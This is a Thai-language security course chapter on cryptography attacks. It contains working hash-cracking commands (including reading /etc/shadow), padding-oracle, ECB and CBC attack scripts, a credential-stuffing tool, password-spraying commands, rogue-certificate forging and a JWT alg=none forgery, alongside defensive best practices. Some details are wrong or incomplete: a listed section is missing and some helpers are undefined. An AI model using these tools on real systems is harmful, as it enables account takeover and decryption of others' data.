# Part 62: Cryptography Attacks

## สารบัญ
1. [Cryptography Fundamentals](#fundamentals)
2. [Hash Cracking](#hash-cracking)
3. [Weak Encryption Attacks](#weak-encryption)
4. [SSL/TLS Attacks](#ssl-tls)
5. [PKI Attacks](#pki-attacks)
6. [Password Attacks](#password-attacks)
7. [Side-Channel Attacks](#side-channel)
8. [Blockchain และ Crypto Attacks](#blockchain)
9. [Cryptographic Implementation Flaws](#implementation-flaws)
10. [Defense และ Best Practices](#defense)

---

## 1. Cryptography Fundamentals {#fundamentals}

### ประเภทของ Cryptography

```
Symmetric Encryption:
  ┌────────┐   Key K   ┌────────┐
  │Plaintext│ ───────→ │Ciphertext│
  └────────┘    AES   └────────┘
  Algorithms: AES, ChaCha20, 3DES

Asymmetric Encryption:
  Public Key → Encrypt
  Private Key → Decrypt
  Algorithms: RSA, ECC, ElGamal

Hashing:
  Input → Hash Function → Fixed-length digest
  Algorithms: SHA-256, SHA-3, bcrypt, argon2

MAC/Signature:
  HMAC: Hash + Secret Key
  Digital Signature: Asymmetric + Hash
```

### จุดอ่อนทั่วไป

```python
#!/usr/bin/env python3
# crypto_weakness_checker.py

class CryptoWeaknessChecker:
    WEAK_ALGORITHMS = {
        'hash': ['md5', 'sha1', 'md4', 'md2'],
        'symmetric': ['des', '3des', 'rc4', 'rc2', 'blowfish'],
        'asymmetric': ['rsa-512', 'rsa-768', 'dsa-512'],
        'modes': ['ecb', 'cbc without hmac'],
    }
    
    def check_algorithm(self, algo, key_size=None):
        """Check if algorithm is weak"""
        warnings = []
        algo_lower = algo.lower()
        
        if algo_lower in self.WEAK_ALGORITHMS['hash']:
            warnings.append(f"WEAK HASH: {algo} is cryptographically broken")
        
        if algo_lower in self.WEAK_ALGORITHMS['symmetric']:
            warnings.append(f"WEAK CIPHER: {algo} has known vulnerabilities")
        
        if algo_lower == 'aes' and key_size and key_size < 128:
            warnings.append(f"WEAK KEY SIZE: AES-{key_size} is too small")
        
        if algo_lower == 'rsa' and key_size and key_size < 2048:
            warnings.append(f"WEAK RSA: {key_size}-bit key is insufficient")
        
        return warnings
    
    def check_random_number(self):
        """Check for weak random number generation"""
        issues = [
            'Use os.urandom() or secrets module (NOT random)',
            'Never seed random with predictable values',
            'Use CSPRNG for cryptographic purposes',
        ]
        return issues
    
    def check_password_storage(self, method):
        """Check password storage security"""
        secure_methods = ['bcrypt', 'argon2', 'scrypt', 'pbkdf2_hmac']
        if method.lower() not in secure_methods:
            return f"INSECURE: {method} is not suitable for password hashing"
        return f"OK: {method} is acceptable for passwords"

checker = CryptoWeaknessChecker()
print(checker.check_algorithm('md5'))
print(checker.check_algorithm('aes', 128))
print(checker.check_algorithm('rsa', 1024))
```

---

## 2. Hash Cracking {#hash-cracking}

### Hashcat

```bash
# ติดตั้ง hashcat
apt install hashcat

# รูปแบบ hash
hashcat --example-hashes | grep -A 2 'MD5\|SHA1\|bcrypt'

# MD5 crack (เต็ม speed)
echo '5f4dcc3b5aa765d61d8327deb882cf99' > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# -m 0 = MD5

# SHA1
hashcat -m 100 sha1_hash.txt wordlist.txt

# SHA-256
hashcat -m 1400 sha256_hash.txt wordlist.txt

# NTLM (Windows)
hashcat -m 1000 ntlm_hash.txt wordlist.txt

# NTLMv2
hashcat -m 5600 netntlmv2.txt wordlist.txt

# bcrypt
hashcat -m 3200 bcrypt_hash.txt wordlist.txt
# bcrypt ช้า เพราะ key stretching

# MD5crypt (Linux $1$)
hashcat -m 500 hash.txt wordlist.txt

# SHA512crypt (Linux $6$)
hashcat -m 1800 hash.txt wordlist.txt

# WPA2 handshake
hashcat -m 22000 handshake.hc22000 wordlist.txt

# เพิ่มประสิทธิภาพด้วย rules
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# Mask attack (รูฉ pattern)
hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d?d?d
# ?u = uppercase, ?l = lowercase, ?d = digit

# Combinator
hashcat -m 0 hash.txt -a 1 wordlist1.txt wordlist2.txt

# GPU acceleration (-d GPU)
hashcat -m 0 hash.txt wordlist.txt -d 1 --force
```

### John the Ripper

```bash
# John the Ripper
apt install john

# อ่านและ crack /etc/shadow
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt

# ดู passwords ที่ crack แล้ว
john --show combined.txt

# เส้นหารูปแบบ hash อัตโนมัติ
john --list=formats | grep -i md5
john hash.txt --format=raw-md5 --wordlist=wordlist.txt

# Windows NTLM hash
john ntlm_hashes.txt --format=nt --wordlist=wordlist.txt

# Incremental mode
john hash.txt --incremental

# ZIP password crack
zip2john protected.zip > zip_hash.txt
john zip_hash.txt --wordlist=wordlist.txt

# PDF password
pdf2john protected.pdf > pdf_hash.txt
john pdf_hash.txt --wordlist=wordlist.txt

# SSH private key
ssh2john id_rsa > ssh_hash.txt
john ssh_hash.txt --wordlist=wordlist.txt
```

### Rainbow Table Attacks

```bash
# Rainbow tables (ตารางคำนวณ hash ล่วงหน้า)

# ดาวน์โหลดจาก ophcrack.sourceforge.net
# หรือสร้างเองด้วย rtgen
apt install ophcrack

# ophcrack สำหรับ Windows LM/NTLM
ophcrack -g -d /path/to/tables -t lm_tables

# rainbowcrack
rtgen md5 loweralpha-numeric 1 7 0 3800 33554432 0
rtsort md5_loweralpha-numeric#1-7_0_3800x33554432_0.rt
rcrack hash.txt -f md5_loweralpha-numeric#1-7_0_3800x33554432_0.rt

# ป้องกัน rainbow table ด้วย salt
# hash = SHA256(salt + password)
# ทำให้ pre-computed table ใช้ไม่ได้
```

---

## 3. Weak Encryption Attacks {#weak-encryption}

### ECB Mode Attack

```python
#!/usr/bin/env python3
# ecb_attack.py - โจมตี AES-ECB

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64

# ECB mode เขยาเพราะ identical blocks → identical ciphertext

# ตัวอย่าง: Chosen-plaintext attack on ECB
class ECBAttacker:
    def __init__(self, oracle_func):
        """
        oracle_func: function ที่รับ plaintext และ return ciphertext
        ECB(attacker_input + secret)
        """
        self.oracle = oracle_func
    
    def detect_block_size(self):
        """หา block size"""
        initial_len = len(self.oracle(b''))
        for i in range(1, 64):
            ct = self.oracle(b'A' * i)
            if len(ct) > initial_len:
                return len(ct) - initial_len
        return None
    
    def detect_ecb(self, block_size=16):
        """ตรวจสอบว่าใช้ ECB mode"""
        ct = self.oracle(b'A' * (block_size * 3))
        blocks = [ct[i:i+block_size] for i in range(0, len(ct), block_size)]
        return len(blocks) != len(set(blocks))
    
    def byte_at_a_time_decrypt(self, block_size=16):
        """ถอด secret ทีละบยต์"""
        secret_len = len(self.oracle(b''))
        decrypted = b''
        
        for i in range(secret_len):
            # เติม padding เพื่อให้ byte ที่ต้องการอยู่ท้าย block
            padding = b'A' * (block_size - (i % block_size) - 1)
            target = self.oracle(padding)
            target_block = target[:(i // block_size + 1) * block_size]
            
            # หา byte ที่ตรง
            for b in range(256):
                test = padding + decrypted + bytes([b])
                ct = self.oracle(test)
                test_block = ct[:(i // block_size + 1) * block_size]
                if test_block == target_block:
                    decrypted += bytes([b])
                    print(f"[+] Found byte {i}: {bytes([b])}")
                    break
        
        return decrypted

# แสดงปัญหา ECB penguin effect:
def visualize_ecb_problem():
    """ECB mode เขยา block pattern"""
    key = b'aaaaaaaaaaaaaaaa'  # 16 bytes
    cipher = AES.new(key, AES.MODE_ECB)
    
    # Input ที่มี repeating pattern
    plaintext = b'YELLOW SUBMARINE' * 3
    ct = cipher.encrypt(plaintext)
    
    print("ECB Ciphertext blocks:")
    for i in range(0, len(ct), 16):
        block = ct[i:i+16]
        print(f"Block {i//16}: {block.hex()}")
    
    # สังเกตว่า block 0, 1, 2 เหมือนกัน = ECB is insecure!

visualize_ecb_problem()
```

### Padding Oracle Attack

```python
#!/usr/bin/env python3
# padding_oracle.py - CBC Padding Oracle Attack

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import requests

class PaddingOracleAttack:
    def __init__(self, oracle_url, ciphertext, block_size=16):
        self.oracle_url = oracle_url
        self.ciphertext = ciphertext
        self.block_size = block_size
    
    def check_padding(self, ciphertext):
        """สอบถาม oracle - return True ถ้า padding ถูก"""
        try:
            r = requests.post(self.oracle_url, 
                            data={'ct': ciphertext.hex()},
                            timeout=3)
            # Return True if no padding error (200), False if padding error (500)
            return r.status_code == 200
        except:
            return False
    
    def decrypt_block(self, prev_block, curr_block):
        """Decrypt one block using padding oracle"""
        intermediate = bytearray(self.block_size)
        plaintext = bytearray(self.block_size)
        
        for byte_pos in range(self.block_size - 1, -1, -1):
            padding_val = self.block_size - byte_pos
            
            # สร้าง modified IV
            modified_prev = bytearray(prev_block)
            
            # Set known bytes
            for k in range(byte_pos + 1, self.block_size):
                modified_prev[k] = intermediate[k] ^ padding_val
            
            # Brute force current byte
            for b in range(256):
                modified_prev[byte_pos] = b
                test_ct = bytes(modified_prev) + curr_block
                
                if self.check_padding(test_ct):
                    intermediate[byte_pos] = b ^ padding_val
                    plaintext[byte_pos] = intermediate[byte_pos] ^ prev_block[byte_pos]
                    print(f"[+] Byte {byte_pos}: {chr(plaintext[byte_pos])}")
                    break
        
        return bytes(plaintext)
    
    def decrypt(self):
        """Decrypt entire ciphertext"""
        blocks = [self.ciphertext[i:i+self.block_size] 
                 for i in range(0, len(self.ciphertext), self.block_size)]
        
        plaintext = b''
        for i in range(1, len(blocks)):
            print(f"\n[*] Decrypting block {i}...")
            block_pt = self.decrypt_block(blocks[i-1], blocks[i])
            plaintext += block_pt
        
        return unpad(plaintext, self.block_size)

# padbuster tool:
# padbuster http://target.com/decrypt.php <encrypted_cookie> 8 -encoding 0
```

### Bit Flipping Attack (CBC)

```python
#!/usr/bin/env python3
# cbc_bitflip.py - CBC Bit Flipping Attack

def demonstrate_cbc_bitflip():
    """
    CBC Bit Flip: แก้ไข plaintext โดยปรับ ciphertext
    
    CBC Decryption: P[i] = D(C[i]) XOR C[i-1]
    ถ้าเปลี่ยน C[i-1] → P[i] เปลี่ยนด้วย (block ก่อนจะเสีย
    แต่ block เป้าหมายถูก decrypt ถูกต้อง)
    """
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    import os
    
    key = os.urandom(16)
    iv = os.urandom(16)
    
    # Victim's plaintext
    plaintext = b'user=normal;role=user;admin=false'
    ct = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(plaintext, 16))
    
    print(f"Original ciphertext: {ct.hex()}")
    print(f"Decrypted: {plaintext}")
    
    # โจมตี:เปลี่ยน 'user' เป็น 'admn' และ 'false' เป็น 'true!'
    # ตำแหน่ง: 'role=user' อยู่ที่บล็อกที่ 1 offset 10
    
    # Flip bit ใน previous block
    ct_mutable = bytearray(ct)
    
    # 'u' (0x75) -> 'a' (0x61)
    # Flip C[0][10]: C[0][10] XOR ('u' XOR 'a')
    target_pos = 10  # position of 'u' in 'user'
    ct_mutable[target_pos] ^= ord('u') ^ ord('a')
    
    # Decrypt modified ciphertext
    modified_ct = bytes(ct_mutable)
    decrypted = AES.new(key, AES.MODE_CBC, iv).decrypt(modified_ct)
    
    print(f"\nAfter bit flip:")
    print(f"Block 0 garbled + Block 1 modified: {decrypted}")
    # Block 1 now has 'a' instead of 'u'

demonstrate_cbc_bitflip()
```

---

## 4. SSL/TLS Attacks {#ssl-tls}

### TLS Analysis Tools

```bash
# testssl.sh - comprehensive TLS analyzer
bash testssl.sh https://target.com

# ดู specific checks
testssl.sh --protocols target.com    # check SSL/TLS versions
testssl.sh --ciphers target.com      # check cipher suites
testssl.sh --vulnerable target.com   # check vulnerabilities
testssl.sh --headers target.com      # check security headers

# sslscan
apt install sslscan
sslscan target.com
sslscan --no-failed target.com  # show only supported

# nmap SSL scripts
nmap -p 443 --script ssl-enum-ciphers target.com
nmap -p 443 --script ssl-dh-params target.com
nmap -p 443 --script ssl-heartbleed target.com
nmap -p 443 --script ssl-poodle target.com

# openssl เช็คเวอร์ชัน TLS
openssl s_client -connect target.com:443
openssl s_client -connect target.com:443 -tls1_2
openssl s_client -connect target.com:443 -cipher 'RC4-MD5'  # test weak

# ดู certificate details
openssl s_client -connect target.com:443 </dev/null 2>/dev/null | \
    openssl x509 -noout -text
```

### BEAST/POODLE/HEARTBLEED

```bash
# HEARTBLEED (CVE-2014-0160) - OpenSSL ข้อมูลรั่วไหล

# ตรวจสอบ
nmap -p 443 --script ssl-heartbleed target.com

# Python PoC
python3 heartbleed.py target.com 443

# POODLE (CVE-2014-3566) - SSL 3.0 vulnerability
nmap -p 443 --script ssl-poodle target.com

# BEAST (Browser Exploit Against SSL/TLS)
# Affects TLS 1.0 with CBC mode
# Check with:
openssl s_client -connect target.com:443 -tls1
# ถ้า connect ได้ = vulnerable to BEAST

# ROBOT Attack - RSA PKCS#1 v1.5
nmap -p 443 --script tls-ticketbleed target.com

# DROWN Attack - SSLv2 บน server อื่น
# check https://drownattack.com/

# ตรวจสอบ RC4
openssl s_client -connect target.com:443 -cipher RC4-SHA 2>/dev/null | grep 'Cipher'

# SWEET32 (3DES Birthday Attack)
openssl s_client -connect target.com:443 -cipher DES-CBC3-SHA 2>/dev/null
```

### Certificate Attacks

```bash
# ตรวจสอบ certificate transparency
curl 'https://crt.sh/?q=target.com&output=json' | python3 -m json.tool

# หา wildcard และ subdomain certificates
curl 'https://crt.sh/?q=%25.target.com&output=json' | \
    python3 -c "import json,sys; [print(c['name_value']) for c in json.load(sys.stdin)]"

# ช่องโหว่ certificate validation
python3 << 'EOF'
import ssl, socket

# Bad: verify=False (no cert check)
import requests
r = requests.get('https://target.com', verify=False)  # VULNERABLE!

# Good: verify=True (default)
r = requests.get('https://target.com', verify=True)  # Secure
EOF

# MITM with invalid cert (Burp Suite)
# Burp generates its own CA แล้ว sign certificates
# ถ้า client trust Burp CA → MITM สำเร็จ

# Certificate pinning bypass
# Android: Frida / Objection
frida -U -l ssl_pinning_bypass.js -f target.app --no-pause
```

---

## 5. PKI Attacks {#pki-attacks}

### Certificate Authority Compromise

```bash
# สร้าง self-signed CA
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 1826 -key ca.key -out ca.crt

# Issue certificate สำหรับ target domain (imitating legit CA)
openssl genrsa -out server.key 2048
openssl req -new -key server.key -out server.csr \
    -subj '/CN=target.com/O=Target/C=TH'

# Sign ด้วย CA
openssl x509 -req -days 365 -in server.csr -CA ca.crt -CAkey ca.key \
    -CAcreateserial -out server.crt

# ถ้า victim trust CA ของเรา → MITM สำเร็จ

# MD5 collision ใน certificates (historical)
# Rogue CA attack (2008) - MD5 collision สร้าง CA certificate ปลอม

# SAN bypass: Null byte in CN
# CN: 'target.com\x00.evil.com' ใน OpenSSL เวอร์ชั่นเก่า
# ทำให้ตรวจสอบเฉพาะ 'target.com'

# ตรวจสอบห่วงโซ่ของ certificate
openssl x509 -in server.crt -text -noout | grep -A 2 'Subject:\|SAN\|Issuer'
```

### RSA Attacks

```python
#!/usr/bin/env python3
# rsa_attacks.py

from Crypto.PublicKey import RSA
from Crypto.Util.number import *
import math

class RSAAttacker:
    def small_public_exponent(self, ciphertext, e, n):
        """
        Low public exponent attack (e=3)
        ถ้า e เล็ก และ m^e < n → ถอด cube root
        """
        if e == 3:
            m = iroot(ciphertext, 3)[0]
            if pow(m, 3) == ciphertext:
                return long_to_bytes(m)
        return None
    
    def common_modulus_attack(self, e1, e2, c1, c2, n):
        """
        Common modulus attack:
        ถ้า same message m ถูก encrypt ด้วย e1, e2 ที่ gcd(e1,e2)=1
        → สามารถหา m โดยไม่ต้องรู้ private key
        """
        if math.gcd(e1, e2) == 1:
            # Extended Euclidean: s1*e1 + s2*e2 = 1
            g, s1, s2 = extended_gcd(e1, e2)
            m = (pow(c1, s1, n) * pow(c2, s2, n)) % n
            return long_to_bytes(m)
        return None
    
    def wiener_attack(self, e, n):
        """
        Wiener's attack: ถ้า d < n^0.25 (small private exponent)
        → สามารถหา d จาก e/n ด้วย continued fractions
        """
        cf = continued_fraction(e, n)
        convergents = get_convergents(cf)
        
        for k, d in convergents:
            if k == 0:
                continue
            phi = (e * d - 1) // k
            # Check if phi is valid
            b = n - phi + 1
            discriminant = b*b - 4*n
            if discriminant >= 0:
                sqrt_disc = iroot(discriminant, 2)
                if sqrt_disc[1]:  # perfect square
                    p = (b + sqrt_disc[0]) // 2
                    q = (b - sqrt_disc[0]) // 2
                    if p * q == n:
                        return d
        return None
    
    def factor_small_n(self, n):
        """Factor small or poorly chosen n"""
        # Trial division
        for p in range(2, min(1000000, int(n**0.5) + 1)):
            if n % p == 0:
                return p, n // p
        return None

def extended_gcd(a, b):
    if a == 0:
        return b, 0, 1
    gcd, x1, y1 = extended_gcd(b % a, a)
    return gcd, y1 - (b // a) * x1, x1

# FactorDB - สอบถามฟรี factor database
import requests

def check_factordb(n):
    r = requests.get(f'http://factordb.com/api?query={n}')
    return r.json()
```

---

## 6. Password Attacks {#password-attacks}

### Password Spraying

```bash
# Password spraying - ใช้ 1-2 passwords กับ users ทั้งหมด
# หลีก account lockout

# Kerbrute - spray against Kerberos
kerbrute passwordspray -d domain.com users.txt 'Password2024!'

# CrackMapExec - SMB spray
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password2024!'

# Spray-AD
python3 Spray-AD.py -d domain.com -u users.txt -p 'Winter2024!'

# จริงๆ คอยระวังเรื่อง lockout threshold!
# ตรวจสอบ policy:
net accounts /domain
# Account lockout threshold: 5
# -> ควรลองไม่เกิน 3 ครั้งต่อ account

# รอให้พ้น lockout window (ปกติ 30-60 นาที)
```

### Credential Stuffing

```python
#!/usr/bin/env python3
# credential_stuffer.py

import requests
from concurrent.futures import ThreadPoolExecutor
import time

class CredentialStuffer:
    def __init__(self, target_url, username_field, password_field):
        self.url = target_url
        self.u_field = username_field
        self.p_field = password_field
        self.valid = []
    
    def try_credential(self, username, password):
        """Try one credential pair"""
        try:
            data = {
                self.u_field: username,
                self.p_field: password
            }
            r = requests.post(self.url, data=data, timeout=10,
                            allow_redirects=True)
            
            # ตรวจสอบสัญญาณสำเร็จ
            success_indicators = [
                'dashboard', 'profile', 'logout', 'welcome'
            ]
            failure_indicators = [
                'invalid', 'error', 'wrong', 'failed'
            ]
            
            response_lower = r.text.lower()
            
            if any(ind in response_lower for ind in success_indicators):
                print(f"[+] VALID: {username}:{password}")
                self.valid.append((username, password))
                return True
            
        except Exception as e:
            pass
        return False
    
    def load_credentials(self, cred_file):
        """โหลด credential list จากไฟล์"""
        creds = []
        with open(cred_file, 'r', errors='ignore') as f:
            for line in f:
                parts = line.strip().split(':')
                if len(parts) >= 2:
                    creds.append((parts[0], ':'.join(parts[1:])))
        return creds
    
    def run(self, cred_file, max_workers=5, delay=0.5):
        """Run credential stuffing"""
        creds = self.load_credentials(cred_file)
        print(f"[*] Loaded {len(creds)} credential pairs")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            for user, pwd in creds:
                executor.submit(self.try_credential, user, pwd)
                time.sleep(delay)  # Rate limiting
        
        print(f"\n[+] Valid credentials found: {len(self.valid)}")
        return self.valid

# ใช้งานใน authorized test:
stuffer = CredentialStuffer(
    'http://target.com/login',
    'email',
    'password'
)
# stuffer.run('leaked_creds.txt')
```

---

## 7. Side-Channel Attacks {#side-channel}

### Timing Attack

```python
#!/usr/bin/env python3
# timing_attack.py - โจมตีผ่านเวลาที่ใช้ในการเปรียบเทียบ

import time
import requests
import statistics

class TimingAttack:
    def __init__(self, url):
        self.url = url
    
    def measure_response_time(self, payload, n=10):
        """วัดเวลา response หลายครั้ง"""
        times = []
        for _ in range(n):
            start = time.perf_counter()
            try:
                requests.post(self.url, data=payload, timeout=5)
            except:
                pass
            end = time.perf_counter()
            times.append(end - start)
        
        return statistics.median(times)
    
    def username_enumeration(self, usernames):
        """
        Username enumeration ผ่าน timing:
        ถ้าเช็ค password hash ช้ากว่า → user มีอยู่
        """
        results = {}
        for username in usernames:
            payload = {'username': username, 'password': 'wrong_password_12345'}
            t = self.measure_response_time(payload)
            results[username] = t
            print(f"[*] {username}: {t:.4f}s")
        
        # User ที่ใช้เวลานานกว่า = มี user อยู่
        valid_users = [u for u, t in results.items() 
                      if t > statistics.mean(list(results.values())) + 
                         statistics.stdev(list(results.values()))]
        return valid_users

# Vulnerable server example:
def vulnerable_compare(secret, user_input):
    """
    เปรียบเทียบแบบนี้คือ timing vulnerable!
    หยุดทันทีเมื่อเจอ byte ที่ต่างกัน
    """
    if len(secret) != len(user_input):
        return False
    for a, b in zip(secret, user_input):
        if a != b:
            return False  # Early exit = timing leak!
    return True

def secure_compare(secret, user_input):
    """เปรียบเทียบแบบ constant time"""
    import hmac
    return hmac.compare_digest(secret.encode(), user_input.encode())
```

---

## 8. Cryptographic Implementation Flaws {#implementation-flaws}

### Common Mistakes

```python
#!/usr/bin/env python3
# crypto_mistakes.py - ตัวอย่างความผิดพลาดที่พบบ่อย

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os
import base64

# MISTAKE 1: Reusing IV in CBC mode
class VulnerableCrypto:
    def __init__(self, key):
        self.key = key
        self.iv = os.urandom(16)  # IV set once at init!
    
    def encrypt(self, plaintext):
        # ผิด: ใช้ IV เดิมทุกครั้ง
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        return self.iv + cipher.encrypt(pad(plaintext.encode(), 16))

class SecureCrypto:
    def __init__(self, key):
        self.key = key
    
    def encrypt(self, plaintext):
        # ถูก: สร้าง IV ใหม่ทุกครั้ง
        iv = os.urandom(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        ct = cipher.encrypt(pad(plaintext.encode(), 16))
        return base64.b64encode(iv + ct).decode()

# MISTAKE 2: ECB mode สำหรับ block data
def bad_encrypt_ecb(key, data):
    # ผิด: ECB ไม่มี randomness
    cipher = AES.new(key, AES.MODE_ECB)  
    return cipher.encrypt(pad(data, 16))

# MISTAKE 3: Weak key derivation
def bad_key_derivation(password):
    # ผิด: MD5 เป็น key derivation
    import hashlib
    return hashlib.md5(password.encode()).digest()

def good_key_derivation(password, salt=None):
    # ถูก: PBKDF2 หรือ argon2
    from Crypto.Protocol.KDF import PBKDF2
    if not salt:
        salt = os.urandom(16)
    key = PBKDF2(password, salt, dkLen=32, count=100000)
    return key, salt

# MISTAKE 4: Predictable randomness
import random

def bad_token_gen():
    # ผิด: random ไม่ cryptographically secure
    return str(random.randint(0, 999999))

def good_token_gen():
    # ถูก: secrets module
    import secrets
    return secrets.token_hex(32)

# MISTAKE 5: ไม่ใช้ authenticated encryption
def bad_encrypt_cbc(key, plaintext):
    # ผิด: CBC ไม่มี integrity check
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(pad(plaintext, 16))

def good_encrypt_gcm(key, plaintext):
    # ถูก: GCM มี authentication tag
    from Crypto.Cipher import AES as AES_
    cipher = AES_.new(key, AES_.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    return cipher.nonce + tag + ciphertext

print("Secure token:", good_token_gen())
key = os.urandom(32)
pt = b'Sensitive data'
ct = good_encrypt_gcm(key, pt)
print(f"GCM ciphertext length: {len(ct)} bytes")
```

---

## 9. Defense และ Best Practices {#defense}

### Crypto Best Practices

```python
#!/usr/bin/env python3
# crypto_best_practices.py

# 1. หลักเกณฑ์: อย่าสร้าง crypto เอง
print("Use established crypto libraries: PyCA cryptography, nacl")

# 2. Key management
from cryptography.fernet import Fernet

# Generate key
key = Fernet.generate_key()
f = Fernet(key)

# Encrypt
token = f.encrypt(b'Secret message')
print(f"Encrypted: {token}")

# Decrypt
original = f.decrypt(token)
print(f"Decrypted: {original}")

# 3. เส้นหาแบบที่แนะนำ
# Symmetric: AES-256-GCM (authenticated encryption)
# Asymmetric: RSA-2048 หรือ ECC P-256
# Hash: SHA-256 หรือ SHA-3
# Password: argon2id หรือ bcrypt (cost factor 12+)
# KDF: PBKDF2-HMAC-SHA256 (100,000+ iterations)
# Random: os.urandom() / secrets module

# 4. Key rotation
class KeyManager:
    def __init__(self):
        self.keys = {}
        self.current_version = 0
    
    def rotate_key(self):
        self.current_version += 1
        self.keys[self.current_version] = Fernet.generate_key()
        return self.current_version
    
    def encrypt(self, data):
        version = self.current_version
        key = self.keys[version]
        f = Fernet(key)
        # Prepend version to ciphertext
        return version.to_bytes(4, 'big') + f.encrypt(data)
    
    def decrypt(self, token):
        version = int.from_bytes(token[:4], 'big')
        key = self.keys.get(version)
        if not key:
            raise ValueError("Unknown key version")
        f = Fernet(key)
        return f.decrypt(token[4:])
```

### Crypto Audit Checklist

```
Cryptography Security Audit:

Algorithms:
☐ ไม่ใช้ MD5, SHA-1 สำหรับ security purposes
☐ ไม่ใช้ DES, 3DES, RC4
☐ AES key size >= 128 bit (prefer 256)
☐ RSA key size >= 2048 bit

Implementation:
☐ ไม่ reuse IV/nonce
☐ ไม่ใช้ ECB mode
☐ ใช้ authenticated encryption (GCM, CCM)
☐ ใช้ constant-time comparison

Random:
☐ ใช้ CSPRNG (os.urandom, secrets)
☐ ไม่ใช้ random module สำหรับ crypto

Password:
☐ ใช้ bcrypt/argon2 ไม่ใช้ MD5/SHA
☐ Salt ทุก password
☐ Cost factor สูงพอ

Certificates:
☐ Validate certificate chain
☐ Check revocation (OCSP/CRL)
☐ Pin certificates ใน mobile apps
☐ ไม่ verify=False
```

---

## แบบฝึกหัด - Cryptanalysis Lab

```bash
# Lab 1: Hash cracking
echo -n 'password123' | md5sum
# 482c811da5d5b4bc6d497ffa98491e38

hashcat -m 0 482c811da5d5b4bc6d497ffa98491e38 /usr/share/wordlists/rockyou.txt

# Lab 2: JWT attack
# สร้าง JWT ไม่ถูกต้อง
python3 << 'EOF'
import jwt
import base64
import json

# Decode JWT
token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSIsInJvbGUiOiJ1c2VyIn0.signature'

# Decode without verification
parts = token.split('.')
payload = json.loads(base64.b64decode(parts[1] + '=='))
print(f"Payload: {payload}")

# alg=none attack
header = json.loads(base64.b64decode(parts[0] + '=='))
header['alg'] = 'none'

new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
new_payload = parts[1]
none_token = f"{new_header}.{new_payload}."
print(f"alg=none token: {none_token}")
EOF

# Lab 3: TLS check
testssl.sh --parallel https://testssl.sh/
```

---

## สรุป

| Attack | Target | Tool |
|--------|--------|------|
| Hash Cracking | MD5/SHA1 | hashcat, john |
| Padding Oracle | AES-CBC | padbuster |
| ECB Byte-at-time | AES-ECB | custom script |
| JWT alg=none | JWT tokens | manual |
| Timing Attack | Login forms | timing scripts |
| TLS Downgrade | HTTPS | testssl.sh |
| Heartbleed | OpenSSL | nmap script |

---

← [Part 61: IoT Security](Part-61-IoT-Security.md) | [Part 63: OSINT Advanced](Part-63-OSINT-Advanced.md) →
